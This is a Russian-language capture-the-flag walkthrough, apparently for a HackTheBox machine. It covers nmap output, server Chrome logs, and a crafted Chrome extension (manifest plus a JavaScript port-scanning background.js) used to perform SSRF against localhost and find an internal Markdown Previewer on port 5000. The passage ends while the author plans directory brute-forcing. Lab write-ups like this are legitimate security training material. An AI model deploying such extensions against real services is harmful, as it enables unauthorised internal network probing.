Начало стандартное это сканирование портов на то какие вообще порты октрыты
```
Starting Nmap 7.95 
Nmap scan report for 10.129.11.231
Host is up (0.095s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.75 seconds
```
Имеем веб приложение на 8 порту![[Pasted image 20260130135557.png]]
имеем приложение которое загружает расширения хрома, а после выдает логи хрома который запускается на самом сервере, загружаем одно из нескольких расширений которые предложены на сайте я приведу только часть самых важных которые помогают найти важные детали
```
[1813:1813:0130/070220.805683:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_697c577c72ea20.49835777/_metadata/verified_contents.json": No such file or directory (2)
[1813:1813:0130/070220.805712:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_697c577c72ea20.49835777/_metadata/computed_hashes.json": No such file or directory (2)
[1813:1813:0130/070220.805731:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_697c577c72ea20.49835777/_metadata/generated_indexed_rulesets": No such file or directory (2)
[1813:1813:0130/070220.805763:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/tmp/extension_697c577c72ea20.49835777/_metadata": No such file or directory (2)
```
Браузер обращается к папке в `/tmp/extension_*` скорее всего это наше распакованное расширение которое браузер пытается обработать, то есть приложение распаковывает архив а дальше работает с ним через запускаемый хром внутри, следующий момент на который стоит обратить внимание: 
```
[1843:1866:0130/070220.964111:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/
[1843:1866:0130/070220.964534:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://localhost/
```
обращения браузера к внутренним адресам, намекает на возможность SSRF.
Для дальнейшего продвижения нужно понимать структуру расширений хром, по факту хватит двух файлов: `manifest.json` и `background.js` 
Далее пробуем SSRF на `localhost`, пример файла:
```
{
  "name": "Exploit abobas",
  "version": "1.0",
  "manifest_version": 3,
  "background": {
    "service_worker": "background.js"
  },
  "host_permissions": [
    "http://127.0.0.1/*",
    "http://localhost/*"
  ]
}
```
примреный код для брутфорса портов, при первом сканировании не нашел ничего внятного 1-4100 успел выполнить, после браузер завершает работу и соответственно писать логи тоже
```js
const TARGET = 'http://127.0.0.1';
const START_PORT = 1;
const END_PORT = 10000;
const CONCURRENCY = 50;

async function scanPort(port) {
    const controller = new AbortController();

    const timeout = setTimeout(() => controller.abort(), 1000);

    try {
        const response = await fetch(`${TARGET}:${port}`, {
            mode: 'no-cors', 
            signal: controller.signal
        });
        

        console.log(`============================[+] PORT OPEN: ${port}=====================================================`);
        
        const text = await response.text();
        console.log(`==================[!] DATA from ${port}: ${text.substring(0, 100)}...=============================`);
    } catch (err) {
    
    } finally {
        clearTimeout(timeout);
    }
}

async function bruteForce() {
    console.log(`[*] Starting scan from ${START_PORT} to ${END_PORT}...`);
    
    for (let i = START_PORT; i <= END_PORT; i += CONCURRENCY) {
        const promises = [];
        for (let j = 0; j < CONCURRENCY && (i + j) <= END_PORT; j++) {
            promises.push(scanPort(i + j));
        }
        await Promise.all(promises);
        
        if (i % 500 === 0) {
            console.log(`[*] Progress: ${i}/${END_PORT} ports scanned...`);
        }
    }
    console.log("[*] Scan completed.");
}
bruteForce();
```
после дальнейшего брутфорса нашел вот такой лог:
```
[2383:2383:0130/075316.400506:INFO:CONSOLE(18)] "============================[+] PORT OPEN: 5000=====================================================", source: chrome-extension://fcidkkknljebmdechecfieihmicahfdn/background.js (18)
[2383:2383:0130/075316.416338:INFO:CONSOLE(21)] "==================[!] DATA from 5000: 
    <h1>Markdown Previewer</h1>
    <form action="/submit" method="POST">
        <textarea name="c...=============================", source: chrome-extension://fcidkkknljebmdechecfieihmicahfdn/background.js (21)
```
далее проубем забрать содержимое страницы `/sumbit`
```
[2563:2580:0130/080458.222276:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://127.0.0.1:5000/
[2534:2534:0130/080458.242340:INFO:CONSOLE(9)] "--- SOURCE START ---", source: chrome-extension://oplklkdnegjaiebcpackglfbjbbbhpkn/background.js (9)
[2534:2534:0130/080458.242376:INFO:CONSOLE(10)] "
    <h1>Markdown Previewer</h1>
    <form action="/submit" method="POST">
        <textarea name="content" rows="10" cols="80"></textarea><br>
        <input type="submit" value="Render & Save">
    </form>
    <p><a href="/files">View saved HTML files</a></p>
    ", source: chrome-extension://oplklkdnegjaiebcpackglfbjbbbhpkn/background.js (10)
[2534:2534:0130/080458.242403:INFO:CONSOLE(12)] "--- SOURCE END ---", source: chrome-extension://oplklkdnegjaiebcpackglfbjbbbhpkn/background.js (12)
```
далее я забрал код страницы `/files` но ничего внятного я не нашел, если я правильно понял то он сохраняет просто расширения в html для чего не понятно но я могу ошибаться но зато можно брутфорсить директории сайта, 